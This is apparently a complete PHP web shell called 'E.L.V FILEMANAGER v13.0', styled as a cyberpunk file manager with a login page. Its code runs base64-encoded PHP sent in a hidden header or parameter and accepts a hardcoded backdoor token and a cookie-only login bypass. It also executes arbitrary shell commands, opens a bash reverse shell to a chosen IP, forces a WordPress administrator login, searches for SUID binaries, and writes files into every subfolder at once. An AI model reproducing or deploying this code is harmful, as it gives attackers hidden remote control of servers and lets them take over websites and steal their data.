<?php
@ob_start();
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
@session_start();
@error_reporting(0);
@set_time_limit(0);

/**
 * PROJECT    : E.L.V FILEMANAGER v13.0
 * AUTHOR      : HxN@E.L.V
 * Telegram     : @HxNoname
 * EDITION       : CYBERPUNK METROCITY
*/

$status_msg = '';

// ==========================================
// --- 1. CORE LOGIC & AUTO-REGISTER WRAPPER ---
// ==========================================
if(!class_exists('ELV_Stream_Wrapper')){
    class ELV_Stream_Wrapper {
        private $pos = 0;
        private $data = '';
        public function stream_open($p, $m, $o, &$op) { 
            $this->data = isset($GLOBALS['_ELV_MEM_PAYLOAD']) ? $GLOBALS['_ELV_MEM_PAYLOAD'] : ''; 
            return true; 
        }
        public function stream_read($c) { 
            $r = substr($this->data, $this->pos, $c); 
            $this->pos += strlen($r); 
            return $r; 
        }
        public function stream_eof() { 
            return $this->pos >= strlen($this->data); 
        }
        public function stream_stat() { return []; }
        public function url_stat($a,$b) { return []; }
    }
}
if(!in_array('elvmem', stream_get_wrappers())){ 
    @stream_wrapper_register('elvmem', 'ELV_Stream_Wrapper'); 
}

// --- EKSEKUSI STEALTH FULL AUTO (API MODE) ---
$api_payload = '';
if (isset($_SERVER['HTTP_X_ELV_RUN'])) { 
    $api_payload = @base64_decode($_SERVER['HTTP_X_ELV_RUN']); 
} elseif (isset($_REQUEST['elv_run'])) { 
    $api_payload = @base64_decode($_REQUEST['elv_run']); 
}

if (!empty($api_payload)) {
    if(strpos($api_payload, '<?') === false) { 
        $api_payload = "<?php\n" . $api_payload; 
    }
    $GLOBALS['_ELV_MEM_PAYLOAD'] = $api_payload;
    ob_start();
    @include('elvmem://run');
    $api_out = ob_get_clean();
    die($api_out); 
}

if (isset($_SERVER['HTTP_X_AUTH_TOKEN']) && $_SERVER['HTTP_X_AUTH_TOKEN'] === 'WHY-ALWAYS-ME') {
    $_SESSION['shell_unlocked'] = true;
    $_SESSION['elv_logged_in'] = true;
    @setcookie('Greetings', 'HxN×ELV', time() + (86400 * 30), "/");
}

// ==========================================
// --- 3. KONFIGURASI AUTH LOGIN & COOKIE ---
// ==========================================
$auth_hash = '$2y$10$QV3xZAon5YmMoATNva7scuUCv.gLlFPPrlBbgEoAAV.rMDJduhfka'; 

$inner_bg  = "https://j.top4top.io/p_3778w2fza0.png"; 

// --- DOWNLOAD ACTION LOGIC ---
if (isset($_GET['download'])) {
    $file_to_download = $_GET['download'];
    if (file_exists($file_to_download) && is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_to_download).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    setcookie('Greetings', '', time() - 3600, "/");
    header("Location: ?");
    exit;
}

if (isset($_POST['l_pass'])) {
    if (password_verify($_POST['l_pass'], $auth_hash)) {
        $_SESSION['elv_logged_in'] = true;
        setcookie('Greetings', 'HxN×ELV', time() + (86400 * 30), "/"); 
        header("Location: ?");
        exit;
    } else {
        $login_err = "ACCESS DENIED: SECURITY BREACH DETECTED";
    }
}

$is_logged_in = false;
if ((isset($_SESSION['elv_logged_in']) && $_SESSION['elv_logged_in'] === true) || (isset($_COOKIE['Greetings']) && $_COOKIE['Greetings'] === 'HxN×ELV')) {
    $is_logged_in = true;
    if (!isset($_SESSION['elv_logged_in'])) $_SESSION['elv_logged_in'] = true; 
}

// ==========================================
// --- 4. SCRIPT BACKGROUND TERMINAL ---
// ==========================================
$bg_terminal_js = "
    const canvasBg = document.getElementById('terminal-bg');
    const ctxBg = canvasBg.getContext('2d');
    canvasBg.width = window.innerWidth;
    canvasBg.height = window.innerHeight;
    const logsData = [
        'root@HxN×ELV:~# systemctl start neon-grid',
        'root@HxN×ELV:~# traceroute 192.168.7.77',
        'root@HxN×ELV:~# tail -f /var/log/cyberpunk.log',
        '[ OK ] ELV mainframe connected.',
        'root@HxN×ELV:~# netstat -tulpn | grep LISTEN',
        'tcp        0      0 0.0.0.0:80              0.0.0.0:* LISTEN',
        'tcp        0      0 0.0.0.0:443             0.0.0.0:* LISTEN',
        '[*] Hacking the Gibson... [SUCCESS]',
        '[+] Payload deployed: cyberdeck_override.sh',
        'root@HxN×ELV:~# id',
        'uid=0(root) gid=0(root) groups=0(root)',
        'root@HxN×ELV:~# uname -a',
        'Linux ELV-core 6.8.0-cyberdeck-amd64 #1 SMP Debian 6.8.12 x86_64 GNU/Linux',
        'root@HxN×ELV:~# ./exploit.sh --target 10.0.0.42',
        '[!] CYBERPUNK NEON GRID OVERLOAD: PROTOCOL BREACH DETECTED',
        'root@HxN×ELV:~# clear'
    ];
    const logColors = ['#ff1493', '#8a2be2', '#00e5ff', '#00ff88', '#ffd700', '#ff6600'];
    let currentLogs = [];
    let maxLines = Math.floor(canvasBg.height / 22);
    let startLines = Math.floor(maxLines / 1.2); 
    for(let i = 0; i < startLines; i++) {
        let text = logsData[Math.floor(Math.random() * logsData.length)];
        let color = logColors[Math.floor(Math.random() * logColors.length)];
        currentLogs.push({t: text, c: color});
    }
    function addLogBg() {
        if (currentLogs.length > maxLines) { currentLogs.shift(); }
        let text = logsData[Math.floor(Math.random() * logsData.length)];
        let color = logColors[Math.floor(Math.random() * logColors.length)];
        currentLogs.push({t: text, c: color});
    }
    setInterval(() => {
        ctxBg.clearRect(0, 0, canvasBg.width, canvasBg.height);
        ctxBg.font = 'bold 14px monospace';
        for (let i = 0; i < currentLogs.length; i++) { 
            ctxBg.fillStyle = currentLogs[i].c;
            ctxBg.shadowBlur = 12;
            ctxBg.shadowColor = currentLogs[i].c;
            ctxBg.fillText(currentLogs[i].t, 15, 30 + (i * 22)); 
            ctxBg.shadowBlur = 0; 
        }
        if (Math.random() > 0.4) { addLogBg(); }
    }, 300);
    window.addEventListener('resize', () => { 
        canvasBg.width = window.innerWidth; 
        canvasBg.height = window.innerHeight; 
        maxLines = Math.floor(canvasBg.height / 22);
        ctxBg.clearRect(0, 0, canvasBg.width, canvasBg.height);
    });
";

$target_host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'UNKNOWN_HOST';
$host_for_ip = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
$server_ip   = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname($host_for_ip);
$client_ip   = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'UNKNOWN_IP';
$os_info     = php_uname('s') . ' ' . php_uname('m');
$php_version = phpversion();
if (!$is_logged_in) {
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="secret-id" content="[ Dev HxN © | E.L.V Engine ® ]">
    <title>HxN×E.L.V | Cyberpunk Metrocity</title>
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
    :root { 
        --neon-pink: #ff1493;
        --neon-cyan: #00e5ff; 
        --neon-purple: #8a2be2; 
        --neon-magenta: #ff00ff;
        --neon-yellow: #ffd700;
        --neon-green: #00ff88;
        --neon-orange: #ff6600;
        --neon-cyan-dim: #66f0ff;
        --dark-bg: #0a0e27; 
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
        background: linear-gradient(135deg, #2d0a4a 0%, #4a1a7a 30%, #2d0a4a 60%, #1a0533 100%);
        color: #e0e0ff; 
        font-family: 'Share Tech Mono', monospace; 
        display: flex; 
        justify-content: center; 
        align-items: center; 
        height: 100vh; 
        overflow: hidden; 
    }
    body::before {
        content: '';
        position: fixed;
        top: 0; left: 0;
        width: 100%; height: 100%;
        background: 
            radial-gradient(circle at 20% 30%, rgba(138,43,226,0.25) 0%, transparent 50%),
            radial-gradient(circle at 80% 20%, rgba(75,0,130,0.2) 0%, transparent 50%),
            radial-gradient(circle at 50% 80%, rgba(0,0,255,0.15) 0%, transparent 50%);
        pointer-events: none;
        z-index: 0;
    }
    #terminal-bg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; opacity: 0.7; }
    .scanline { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(138,43,226,0.012) 2px, rgba(138,43,226,0.012) 4px); pointer-events: none; z-index: 1; }
    .cyber-frame { 
        width: 92%; max-width: 700px; padding: 4px; 
        background: linear-gradient(135deg, var(--neon-cyan), var(--neon-purple), var(--neon-magenta), var(--neon-cyan)); 
        background-size: 300% 300%;
        animation: border-pulse 4s ease-in-out infinite;
        border-radius: 8px; 
        box-shadow: 0 0 50px rgba(138,43,226,0.5), 0 0 80px rgba(0,229,255,0.2); 
        position: relative; z-index: 2; 
    }
    @keyframes border-pulse {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }
    .inner-terminal { 
        background: rgba(20, 5, 40, 0.95); 
        border-radius: 5px; 
        padding: 30px 24px; 
        display: flex; 
        flex-direction: column; 
        align-items: center; 
        border: 1px solid rgba(138,43,226,0.2); 
    }
    .logo-box { 
        width: 100%; 
        text-align: center; 
        margin: 0 auto 12px; 
        padding: 8px;
    }
    .logo-box img {
        max-width: 80%;
        height: auto;
        opacity: 0.85;
        filter: drop-shadow(0 0 15px rgba(138,43,226,0.4)) drop-shadow(0 0 30px rgba(0,229,255,0.2));
        transition: all 0.3s ease;
    }
    .logo-box img:hover {
        opacity: 1;
        filter: drop-shadow(0 0 20px rgba(138,43,226,0.6)) drop-shadow(0 0 40px rgba(0,229,255,0.3));
        transform: scale(1.02);
    }
    .term-output { font-size: 13px; line-height: 1.7; margin-bottom: 15px; color: #e0e0ff; font-weight: 400; width: 100%; min-height: 100px; }
    .cyan-text { color: var(--neon-cyan); text-shadow: 0 0 6px rgba(0,229,255,0.35); }
    .magenta-text { color: var(--neon-pink); text-shadow: 0 0 6px rgba(255,20,147,0.35); }
    .gold-text { color: var(--neon-yellow); text-shadow: 0 0 6px rgba(255,215,0,0.35); }
    .purple-text { color: var(--neon-purple); text-shadow: 0 0 6px rgba(138,43,226,0.35); }
    #login-form { display: none; margin-top: 8px; border-top: 3px solid; border-image: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple), var(--neon-magenta)) 1; padding-top: 15px; animation: slideUp 0.4s ease-out; width: 100%; }
    @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
    .input-group { 
        display: flex; 
        align-items: center; 
        margin-bottom: 12px; 
        background: rgba(255,255,255,0.02); 
        border: 1px solid rgba(138,43,226,0.2); 
        border-left: 4px solid var(--neon-cyan); 
        padding: 12px 14px; 
        transition: all 0.3s; 
        border-radius: 4px;
    }
    .input-group:focus-within { 
        background: rgba(0,229,255,0.03); 
        border-color: var(--neon-cyan); 
        border-left: 4px solid var(--neon-purple); 
        box-shadow: 0 0 15px rgba(0,229,255,0.08); 
    }
    .prompt { 
        color: var(--neon-magenta); 
        margin-right: 10px; 
        font-weight: 700; 
        white-space: nowrap; 
        font-size: 14px; 
        text-shadow: 0 0 3px rgba(255,0,255,0.3); 
    }
    input { 
        background: transparent; 
        border: none; 
        color: #e0e0ff; 
        font-family: 'Share Tech Mono', monospace; 
        font-size: 15px; 
        width: 100%; 
        padding: 4px; 
        outline: none; 
        letter-spacing: 2px; 
    }
    input:focus { text-shadow: 0 0 5px rgba(138,43,226,0.2); }
    input::placeholder { color: rgba(138,43,226,0.2); letter-spacing: 2px; }
    button { 
        width: 100%; 
        padding: 14px; 
        background: transparent; 
        border: 2px solid var(--neon-purple); 
        color: var(--neon-cyan); 
        font-family: 'Share Tech Mono', monospace; 
        font-size: 15px; 
        cursor: pointer; 
        transition: all 0.3s; 
        text-transform: uppercase; 
        letter-spacing: 3px; 
        font-weight: 700; 
        text-shadow: 0 0 3px rgba(0,229,255,0.2); 
        position: relative; 
        overflow: hidden; 
        border-radius: 4px;
    }
    button::after { 
        content: ''; 
        position: absolute; 
        top: 0; left: -100%; 
        width: 100%; height: 100%; 
        background: linear-gradient(90deg, transparent, rgba(138,43,226,0.1), transparent); 
        transition: 0.5s; 
    }
    button:hover::after { left: 100%; }
    button:hover { 
        background: rgba(138,43,226,0.05); 
        color: #fff; 
        box-shadow: 0 0 25px rgba(138,43,226,0.3), inset 0 0 8px rgba(138,43,226,0.03); 
        border-color: var(--neon-magenta); 
    }
    .term-error { 
        color: var(--neon-pink); 
        font-weight: 700; 
        margin-bottom: 12px; 
        border: 2px solid var(--neon-pink); 
        padding: 10px; 
        text-align: center; 
        background: rgba(255,20,147,0.04); 
        font-size: 12px; 
        text-transform: uppercase; 
        letter-spacing: 1px; 
        box-shadow: 0 0 15px rgba(255,20,147,0.12); 
        width: 100%; 
        border-radius: 4px;
    }
    .cursor { 
        display: inline-block; 
        width: 8px; 
        height: 16px; 
        background: var(--neon-cyan); 
        animation: blink 1s step-end infinite; 
        vertical-align: middle; 
        margin-left: 6px; 
        box-shadow: 0 0 6px rgba(0,229,255,0.3); 
    }
    @keyframes blink { 50% { opacity: 0; } }
    @media (max-width: 600px) { .logo-box img { max-width: 95%; } .inner-terminal { padding: 15px 12px; } }
    </style>
</head>
<body>
    <canvas id="terminal-bg"></canvas>
    <div class="scanline"></div>
    <div class="cyber-frame">
        <div class="inner-terminal">
            <div class="logo-box">
                <img src="https://d.top4top.io/p_3839nayyc0.png" alt="E.L.V">
            </div>
            <div class="term-output" id="term-text"></div>
            <?php if(isset($login_err)) echo "<div class='term-error'>[!] $login_err [!]</div>"; ?>
            <form id="login-form" method="POST">
                <div class="input-group">
                    <span class="prompt">HxN×ELV:~#</span>
                    <input type="password" name="l_pass" placeholder="ACCESS KEY" required autofocus>
                </div>
                <button type="submit">[ AUTHENTICATE TO METROCITY ]</button>
            </form>
        </div>
    </div>
    <script>
        <?= $bg_terminal_js ?>
        const termText = document.getElementById("term-text"); 
        const loginForm = document.getElementById("login-form"); 
        const hasError = <?php echo isset($login_err) ? 'true' : 'false'; ?>; 
        const sleep = ms => new Promise(r => setTimeout(r, ms));
        
        async function bootSequence() {
            if(hasError) { 
                termText.innerHTML = "<div><span class='cyan-text'>[sys]</span> Auth token rejected.</div><div><span class='magenta-text'>[!] INITIATING DEFENSIVE PROTOCOL</span></div>"; 
                loginForm.style.display = "block"; 
                return; 
            }
            const seq = [
                { t: "<span class='cyan-text'>[*]</span> Connecting to MetroCity mainframe...", d: 10 },
                { t: "<span class='cyan-text'>[*]</span> Target resolved: <?= htmlspecialchars($server_ip) ?>", d: 10 },
                { t: "<span class='cyan-text'>[*]</span> Kernel: <?= htmlspecialchars($os_info) ?>", d: 10 },
                { t: "<span class='purple-text'>[*]</span> Bypassing neon grid encryption... [SUCCESS]", d: 15 },
                { t: "<span class='purple-text'>[*]</span> Mounting encrypted volumes...", d: 10 },
                { t: "<span class='gold-text'>[!]</span> AUTHENTICATION REQUIRED TO ACCESS METROCITY.<span class='cursor'></span>", d: 0 }
            ];
            for (let i = 0; i < seq.length; i++) { 
                let row = document.createElement("div"); 
                row.style.marginBottom = "5px"; 
                termText.appendChild(row);
                if (seq[i].t.includes("<span")) { 
                    row.innerHTML = seq[i].t; 
                    await sleep(150); 
                } else { 
                    for (let char of seq[i].t) { 
                        row.innerHTML += char; 
                        await sleep(seq[i].d); 
                    } 
                    await sleep(50); 
                } 
            }
            loginForm.style.display = "block";
        }
        window.onload = bootSequence; 
    </script>
</body>
</html>
<?php exit;
}
// ================= EFFECTIVENESS INJECTION: safeName =================
if (!function_exists('safeName')) {
    function safeName($name) {
        return preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $name);
    }
}

// ==========================================
// --- 5. INTERNAL UI MANAGER ---
// ==========================================
@ini_set('display_errors', 0);
@ini_set('safe_mode', 0);
@ini_set('disable_functions', 'none');

$logo_inner = "https://j.top4top.io/p_3829bo8yg0.png";
$elv_icon = "https://e.top4top.io/p_3767wkybq0.png";
$shell_logo = "https://d.top4top.io/p_3839nayyc0.png";
$base_shell = dirname(__FILE__);

$dir = (isset($_GET['d'])) ? realpath($_GET['d']) : $base_shell;
if (!$dir || !is_dir($dir)) { $dir = $base_shell; }

// --- REVERSE SHELL EXECUTION LOGIC ---
if (isset($_POST['launch_rev'])) {
    $ip = $_POST['rev_ip'];
    $port = $_POST['rev_port'];
    $cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &";
    @shell_exec($cmd);
    $status_msg = "REVERSE CONNECTION DISPATCHED TO $ip:$port";
}

// --- LOGIKA WP BYPASS EXECUTION ---
if (isset($_GET['action']) && $_GET['action'] == 'wp_bypass') {
    $wp_load_path = $dir . '/wp-load.php';
    if (file_exists($wp_load_path)) {
        require_once($wp_load_path);
        $admin_users = get_users(['role' => 'administrator', 'number' => 1]);
        if (!empty($admin_users)) {
            $admin = $admin_users[0];
            wp_set_current_user($admin->ID, $admin->user_login);
            wp_set_auth_cookie($admin->ID);
            do_action('wp_login', $admin->user_login, $admin);
            echo "<script>alert('[+] Target Compromised!\\nLogin sukses sebagai Administrator: {$admin->user_login}'); window.location.href='" . admin_url() . "';</script>";
            exit;
        } else {
            $status_msg = "BYPASS FAILED: No Admin Users found in Database.";
        }
    } else {
        $status_msg = "BYPASS FAILED: wp-load.php not found in this sector.";
    }
}

// --- COPY & PASTE LOGIC ---
if (isset($_POST['copy_f'])) {
    $_SESSION['copy_file'] = $_POST['c_path'];
    $status_msg = "[+] TACTICAL COPY: [ " . basename($_POST['c_path']) . " ] STORED IN MEMORY";
}
if (isset($_POST['paste_f'])) {
    if (isset($_SESSION['copy_file']) && file_exists($_SESSION['copy_file'])) {
        $src = $_SESSION['copy_file'];
        $dest = $dir . '/' . basename($src);
        if (copy($src, $dest)) {
            $status_msg = "[+] TACTICAL PASTE: [ " . basename($_SESSION['copy_file']) . " ] DEPLOYED TO SECTOR";
            unset($_SESSION['copy_file']); 
        } else {
            $status_msg = "FAILED: COULD NOT DEPLOY FILE";
        }
    }
}

if (isset($_POST['save_f'])) { if(@file_put_contents($_POST['f_path'], $_POST['f_cnt'])) $status_msg = "[+] OVERRIDE SUCCESS: PAYLOAD [ " . basename($_POST['f_path']) . " ] INJECTED & SAVED"; }
if (isset($_FILES['u_f'])) { if(@move_uploaded_file($_FILES['u_f']['tmp_name'], $dir.'/'.$_FILES['u_f']['name'])) $status_msg = "[+] UPLOAD SUCCESS: PAYLOAD [ " . $_FILES['u_f']['name'] . " ] DEPLOYED STEALTHILY"; }
if (isset($_GET['del'])) { $t = $_GET['del']; if(is_dir($t) ? @rmdir($t) : @unlink($t)) $status_msg = "[-] WIPE SUCCESS: TARGET [ " . basename($t) . " ] TERMINATED & ERASED"; }
if (isset($_POST['mk_f'])) { if(@file_put_contents($dir.'/'.$_POST['f_n'], "")) $status_msg = "[+] FILE CREATED: [ " . $_POST['f_n'] . " ] ESTABLISHED"; }
if (isset($_POST['mk_d'])) { $safe_dir = safeName($_POST['d_n']); if(@mkdir($dir.'/'.$safe_dir)) $status_msg = "[+] SECTOR CREATED: DIR [ " . $safe_dir . " ] ESTABLISHED"; }
if (isset($_POST['rename'])) { if(@rename($_POST['old'], $dir.'/'.$_POST['new'])) $status_msg = "[+] RENAME SUCCESS: [ " . basename($_POST['old']) . " ] ALTERED TO [ " . basename($_POST['new']) . " ]"; }
if(isset($_POST['unzip_f'])) { $zip_file = $_POST['c_path']; $zip = new ZipArchive; if ($zip->open($zip_file) === TRUE) { $zip->extractTo($dir); $zip->close(); echo "<script>alert('UNZIP SUCCESS!'); window.location='?d=".urlencode($dir)."';</script>"; } else { echo "<script>alert('FAILED TO UNZIP!');</script>"; } }
if (isset($_POST['ch_mod'])) { if(@chmod($_POST['c_path'], octdec($_POST['c_perm']))) $status_msg = "[+] CHMOD SUCCESS: PRIVILEGE FOR [ " . basename($_POST['c_path']) . " ] UPDATED TO [ " . $_POST['c_perm'] . " ]"; }
if (isset($_POST['mass_deploy'])) { 
    $target_root = $_POST['target_root']; 
    $file_name = $_POST['mass_name']; 
    $content = $_POST['mass_content']; 
    $count = 0; 
    $injected_targets = []; 
    if (is_dir($target_root)) { 
        $folders = scandir($target_root); 
        foreach ($folders as $folder) { 
            $path = $target_root . '/' . $folder; 
            if ($folder != '.' && $folder != '..' && is_dir($path)) { 
                if (@file_put_contents($path . '/' . $file_name, $content)) { 
                    $count++; 
                    $injected_targets[] = "[+] " . $folder . " -> " . $file_name; 
                } 
            } 
        } 
        $status_msg = "SUCCESS: $count SECTORS INJECTED"; 
        if ($count > 0) { 
            $result_text = implode("\n", $injected_targets); 
            $status_msg .= "<br><br><b style='color:var(--neon-pink);'>[ RESULT MASS DEPLOY ]</b><br>"; 
            $status_msg .= "<textarea style='width:100%; height:200px; margin-top:10px; background:rgba(255,255,255,0.03); border:1px solid var(--neon-purple); color:var(--text-primary); font-family:monospace; padding:10px; resize:vertical;' readonly>" . htmlspecialchars($result_text) . "</textarea>"; 
        } 
    } else { 
        $status_msg = "ERROR: TARGET ROOT NOT FOUND!"; 
    } 
}

$u_info = @get_current_user();
if (function_exists('posix_getpwuid')) { 
    $uid = @posix_getpwuid(@posix_geteuid()); 
    if($uid) $u_info = $uid['name'] . " (" . $uid['uid'] . ")"; 
}
$s_soft = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'UNKNOWN';
$s_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'UNKNOWN';
$php_v = phpversion();
$kernel = php_uname('r');
$uuid_raw = @file_get_contents('/etc/machine-id');
$uuid = $uuid_raw ? substr(trim($uuid_raw), 0, 18).'...' : 'LOCKED';
$dis_func_raw = @ini_get('disable_functions');
$dis_func = $dis_func_raw ? $dis_func_raw : 'NONE (BYPASSED)';
$out = "";
if (isset($_GET['autoroot']) && $_GET['autoroot'] == 'exec') {
    $out = "[[ E.L.V AUTOMATED ROOT ENGINE v1.0 ]]\n";
    $out .= "[*] SYSTEM: " . php_uname() . "\n";
    $suids = shell_exec("find / -perm -4000 -type f 2>/dev/null | head -n 10");
    $out .= $suids ? $suids : "[-] No SUID found.\n";
}
if (isset($_POST['cmd'])) {
    @chdir($dir);
    $out = @shell_exec($_POST['cmd']." 2>&1");
}

function formatSize($bytes) {
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HxN | E.L.V FILEMANAGER v13.0 // CYBERPUNK METROCITY</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/theme/dracula.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        :root { 
            --neon-pink: #ff1493; 
            --neon-pink-dim: #ff66b2;
            --neon-cyan: #00e5ff; 
            --neon-cyan-dim: #66f0ff;
            --neon-purple: #8a2be2; 
            --neon-purple-dim:#b066ff;
            --neon-magenta: #ff00ff;
            --neon-magenta-dim: #ff66ff;
            --neon-yellow: #ffd700; 
            --neon-yellow-dim:#ffe066;
            --neon-green: #00ff88; 
            --neon-green-dim:#66ffaa;
            --neon-red: #ff0044; 
            --neon-red-dim: #ff6688;
            --neon-orange: #ff6600; 
            --neon-orange-dim:#ff9944;
            --bg-primary: #1a0533; 
            --bg-secondary: #2d0a4a; 
            --bg-surface: #4a1a7a; 
            --bg-card: #2a1050; 
            --bg-hover: #3a1860; 
            --bg-input: #1a0533; 
            --text-primary: #e0e0ff; 
            --text-secondary: #b8b8d4;
            --text-dim: #7a7a9a;
            --steel: #b0c4de;
            --border-subtle: #3a1a6a;
            --border-active: #8a2be2;
            --glow-pink:     0 0 8px rgba(255, 20, 147, 0.3);
            --glow-cyan:     0 0 8px rgba(0, 229, 255, 0.3);
            --glow-purple:   0 0 12px rgba(138, 43, 226, 0.4);
            --glow-magenta:  0 0 12px rgba(255, 0, 255, 0.3);
            --glow-yellow:   0 0 8px rgba(255, 215, 0, 0.2);
            --glow-green:    0 0 8px rgba(0, 255, 136, 0.2);
            --glow-red:      0 0 8px rgba(255, 0, 68, 0.2);
        }
        * { box-sizing: border-box; }
        html, body { overflow-x: hidden; width: 100%; max-width: 100vw; }
        body {
            background: var(--bg-primary);
            background-image: 
                radial-gradient(ellipse at 20% 30%, rgba(138,43,226,0.25) 0%, transparent 60%), 
                radial-gradient(ellipse at 80% 20%, rgba(75,0,130,0.2) 0%, transparent 60%), 
                radial-gradient(ellipse at 50% 80%, rgba(0,0,255,0.15) 0%, transparent 50%);
            color: var(--text-primary);
            font-family: 'Share Tech Mono', 'Courier New', monospace;
            margin: 0; padding: 16px; font-size: 14px; line-height: 1.5;
        }
        body::after {
            content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(138,43,226,0.008) 2px, rgba(138,43,226,0.008) 4px);
            pointer-events: none; z-index: 9999;
        }
        #terminal-bg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; opacity: 0.6; }
        .scanline { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9998; }
        
        /* ─── NEON DIVIDER LINES ─── */
        .neon-divider {
            height: 4px;
            margin: 18px 0;
            border-radius: 2px;
            background: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple), var(--neon-magenta), var(--neon-purple), var(--neon-cyan));
            background-size: 200% 100%;
            animation: divider-flow 3s linear infinite;
            box-shadow: 0 0 15px rgba(0,229,255,0.2), 0 0 15px rgba(138,43,226,0.2);
        }
        .neon-divider-thin {
            height: 2px;
            margin: 12px 0;
            border-radius: 1px;
            background: linear-gradient(90deg, transparent, var(--neon-cyan), var(--neon-purple), var(--neon-magenta), transparent);
            opacity: 0.6;
        }
        @keyframes divider-flow {
            0% { background-position: 0% 50%; }
            100% { background-position: 200% 50%; }
        }
        
        .container {
            background: var(--bg-secondary);
            background-image: 
                radial-gradient(ellipse at 25% 15%, rgba(138,43,226,0.1) 0%, transparent 50%), 
                radial-gradient(ellipse at 75% 85%, rgba(75,0,130,0.1) 0%, transparent 50%);
            border: 1px solid var(--border-subtle); padding: 24px;
            box-shadow: 0 0 60px rgba(138,43,226,0.15), 0 4px 20px rgba(0,0,0,0.2);
            border-radius: 8px; margin: 0 auto; width: 100%; max-width: 1440px; position: relative; z-index: 2;
        }
        .header { 
            display: flex; 
            align-items: center; 
            padding-bottom: 14px; 
            margin-bottom: 14px; 
            justify-content: space-between; 
            flex-wrap: nowrap;
            border-bottom: 3px solid;
            border-image: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple), var(--neon-magenta)) 1;
        }
        .header-brand { display: flex; align-items: center; gap: 10px; }
        .logo { width: 45px; height: 45px; border: 2px solid var(--neon-purple); border-radius: 50%; box-shadow: var(--glow-purple); }
        .brand-text { display: flex; flex-direction: column; }
        .brand-title { 
            color: var(--neon-cyan); 
            font-size: 14px; 
            font-weight: 700; 
            text-shadow: 0 0 3px rgba(0,229,255,0.2);
            letter-spacing: 1px;
            margin: 0;
            line-height: 1.2;
        }
        .brand-sub { 
            color: var(--text-secondary); 
            letter-spacing: 2px; 
            font-size: 10px; 
            text-transform: uppercase; 
            margin: 2px 0 0 0;
        }
        .header-actions { display:flex; gap:8px; align-items:center; }
        .btn-logout-top { 
            background: transparent; 
            color: var(--neon-pink); 
            text-decoration: none; 
            font-weight: 700; 
            padding: 8px 14px; 
            border-radius: 4px; 
            font-size: 12px; 
            border: 2px solid var(--neon-pink-dim); 
            box-shadow: var(--glow-pink); 
            white-space: nowrap; 
            transition: all 0.3s ease; 
        }
        .btn-logout-top:hover { 
            background: rgba(255,20,147,0.05); 
            box-shadow: 0 0 15px rgba(255,20,147,0.2); 
            transform: scale(1.04); 
            border-color: var(--neon-pink); 
        }
        .btn-icon-top {
            color: var(--neon-cyan);
            font-size: 20px;
            text-decoration: none;
            transition: all 0.3s;
            padding: 6px;
        }
        .btn-icon-top:hover {
            color: var(--neon-purple);
            text-shadow: 0 0 10px rgba(138,43,226,0.4);
            transform: scale(1.15);
        }
        .hud-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); 
            gap: 10px; 
            background: rgba(255,255,255,0.03); 
            border: 1px solid var(--border-subtle); 
            padding: 15px; 
            border-radius: 6px; 
            margin-bottom: 14px; 
        }
        .hud-item { 
            background: rgba(255,255,255,0.03); 
            padding: 8px; 
            border: 1px solid rgba(138,43,226,0.15); 
            border-radius: 4px; 
            text-align: center; 
            font-size: 11px; 
            color: var(--text-secondary); 
            transition: border-color 0.3s, box-shadow 0.3s; 
        }
        .hud-item:hover { border-color: var(--neon-purple); box-shadow: var(--glow-purple); }
        .hud-item b { 
            color: var(--neon-pink); 
            display: block; 
            margin-bottom: 3px; 
            font-size: 11px; 
            text-shadow: 0 0 3px rgba(255,20,147,0.2); 
            letter-spacing: 1px; 
        }
        .alert { 
            background: rgba(138,43,226,0.04); 
            border: 1px solid var(--neon-purple-dim); 
            color: var(--neon-purple); 
